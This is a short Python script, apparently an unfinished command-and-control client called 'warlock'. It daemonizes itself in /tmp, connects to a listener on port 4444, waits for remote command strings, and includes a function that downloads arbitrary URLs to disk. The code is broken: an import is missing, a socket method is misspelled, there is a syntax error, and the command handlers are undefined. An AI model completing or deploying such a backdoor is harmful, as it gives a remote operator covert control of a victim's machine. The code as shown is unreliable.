import daemon
import socket
import os
import requests

name = "warlock"
location = "/tmp/{0}".format(name)
server_address = ("127.0.0.1", 4444)

def deamon():
	if not os.path.exists("{0}".format(location)):
		os.makedirs("{0}".format(location))

	context = daemon.DaemonContext(
	    working_directory=location,
	    umask=0o002,
	    pidfile=lockfile.FileLock('{0}/{1}.pid'.format(location, name)),
	    )

	with context:
		worker()

def worker():
	name = "warlock"
	location = "/tmp/{0}".format(name)
	server_address = ("127.0.0.1", 4444)
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(server_address)
	while True:
		if sock.recieve == "hoi":
			hoi()
		if sock.recieve == "doei"
			doei()

def download(url):
	name = url.rsplit('/', 1)[1]
	
	r = requests.get(url, allow_redirects=True)
	open(name, 'wb').write(r.content)
	